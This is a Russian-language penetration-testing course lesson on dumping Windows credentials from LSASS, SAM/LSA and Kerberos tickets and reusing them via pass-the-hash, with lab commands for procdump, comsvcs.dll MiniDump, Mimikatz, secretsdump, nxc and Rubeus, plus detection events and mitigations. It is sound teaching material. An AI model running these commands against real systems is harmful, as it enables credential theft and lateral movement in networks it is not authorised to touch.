# 10.5 — Дамп кредов и reuse

> **M10 · Этап 1 · 4 ч · 🟡 · артефакт:** `labs/m10-privesc/l05-creds/`

## Цель

Научиться извлекать учётные данные из памяти, реестра и хранилищ Windows, а затем переиспользовать их — легально и с пониманием последствий.

## Результат

- Дамп LSASS и SAM/LSA в лаборатории.
- Рабочий pass-the-hash.
- Список артефактов, которые вы оставили.

## Теория

### 1. Где живут секреты

| Источник | Что внутри | Инструмент |
|---|---|---|
| LSASS | NTLM-хэши, Kerberos-билеты, plaintext (если WDigest) | Mimikatz, `procdump` |
| SAM | локальные NTLM-хэши | `secretsdump`, reg save |
| SECURITY | LSA secrets, DPAPI machine key | `secretsdump` |
| NTDS.dit | хэши домена | `ntdsutil`, `secretsdump` (DC) |
| DPAPI | пароли браузеров, Credential Manager | Mimikatz `dpapi`, `DonPAPI` |
| Кэш домена | DCC2 (mscache) | `secretsdump` |
| Файлы | `unattend.xml`, скрипты, `.git`, конфиги | ручной поиск |

### 2. LSASS

LSASS хранит материал аутентификации. Способы доступа:

- **Mimikatz** `sekurlsa::logonpasswords` — требует admin (и часто отключение PPL).
- **procdump** — легитимная утилита Sysinternals, создаёт minidump; затем разбор офлайн.
- **comsvcs.dll MiniDump** — LOLBin-путь: `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full`.
- **Task Manager** — «Create dump file» вручную.

С Windows 8.1+ включён **LSA Protection (RunAsPPL)**, который блокирует доступ даже администратору. Обход требует уязвимого драйвера — это отдельная тема и громкий шаг.

### 3. SAM и LSA

```text
reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SECURITY security.hiv
secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```

Или удалённо: `secretsdump.py domain/user:pass@10.10.10.20`.

### 4. Pass-the-hash (PtH)

NTLM-аутентификация не требует пароля — достаточно хэша:

```bash
nxc smb 10.10.10.20 -u alice -H <NThash> --shares
impacket-psexec -hashes :<NThash> DOMAIN/alice@10.10.10.20
```

Важно: PtH работает для NTLM, но не для Kerberos-only окружений. Для Kerberos есть **overpass-the-hash** (получить TGT по хэшу) и **pass-the-ticket**.

### 5. Билеты Kerberos

```text
sekurlsa::tickets /export
Rubeus.exe dump /nowrap
```

Билет `.kirbi` можно импортировать (`kerberos::ptt`) и использовать, пока он жив. `.ccache` — Linux-формат для Impacket.

### 6. Детект

- Sysmon Event ID 10 — `GrantedAccess` к `lsass.exe` (0x1010, 0x1410).
- 4688 — `rundll32 comsvcs.dll MiniDump`, `procdump`.
- 4624 type 9 — `Logon Process: seclogo`, `Authentication Package: Negotiate`.
- 4672 — special privileges у нового входа.
- Defender: ASR «Block credential stealing from lsass», Credential Guard.
- EDR: alerts на доступ к LSASS, аномальные named pipes, массовые SMB-логины.

## Лаборатория

> `WIN01` + контроллер домена `DC01` из M05. Всё только в изолированной сети. Снимок обязателен.

### 1. Подготовка

```powershell
# на WIN01, от администратора
whoami /priv | findstr /i "debug backup"
Get-Process lsass | Select-Object Id,ProcessName
```

Ожидаемо: PID LSASS и наличие привилегий.

### 2. Дамп через procdump

```powershell
C:\lab\procdump64.exe -accepteula -ma (Get-Process lsass).Id C:\lab\lsass.dmp
```

Ожидаемо: файл `lsass.dmp`. Скопируйте на Linux-атакующий хост.

### 3. Разбор Mimikatz (в изолированной ВМ)

```text
mimikatz # sekurlsa::minidump C:\lab\lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Ожидаемо: пользователи, домен, NTLM-хэши, возможно plaintext. Запишите только те строки, которые нужны для отчёта (без реальных паролей в git).

### 4. SAM/LSA

```powershell
reg save HKLM\SAM C:\lab\sam.hiv
reg save HKLM\SYSTEM C:\lab\system.hiv
reg save HKLM\SECURITY C:\lab\security.hiv
```

На Linux:

```bash
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```

Ожидаемо: локальные хэши и LSA secrets.

### 5. Pass-the-hash

```bash
nxc smb 10.10.10.20 -u Administrator -H <NThash> --shares
nxc smb 10.10.10.20 -u Administrator -H <NThash> -x "whoami"
```

Ожидаемо: `NT AUTHORITY\SYSTEM` или администратор. Если NTLM отключён — фиксируйте ошибку и переходите к Kerberos.

### 6. Билеты

```powershell
Rubeus.exe dump /nowrap
```

Ожидаемо: base64-билеты. Импорт:

```powershell
Rubeus.exe ptt /ticket:<base64>
klist
```

### 7. Следы

```powershell
Get-WinEvent -LogName Security -MaxEvents 200 |
  Where-Object Id -in 4624,4672,4688 |
  Select-Object TimeCreated,Id,Message
```

Ожидаемо: входы type 9, special privileges, запуск procdump. Сопоставьте с вашими действиями.

## Атака и защита

- **Атака:** LSASS dump → хэши → PtH → горизонтальное движение; билеты → доступ к сервисам.
- **Детект:** Sysmon 10, 4688, 4624/4672, аномалии SMB, EDR-правила на LSASS.
- **Фикс:** Credential Guard, LSA Protection, ASR, запрет NTLM, tiered admin, LAPS, минимальные права, ротация `krbtgt` при компрометации.

## Самопроверка

- [ ] Почему pass-the-hash вообще возможен?
- [ ] Чем DCC2 отличается от NTLM-хэша?
- [ ] Что блокирует RunAsPPL и как его обходят?
- [ ] Какой событийный признак даёт `comsvcs.dll MiniDump`?
- [ ] Почему Credential Guard ломает часть атак?

## Дальше

[Контрольная M10](exam.md)
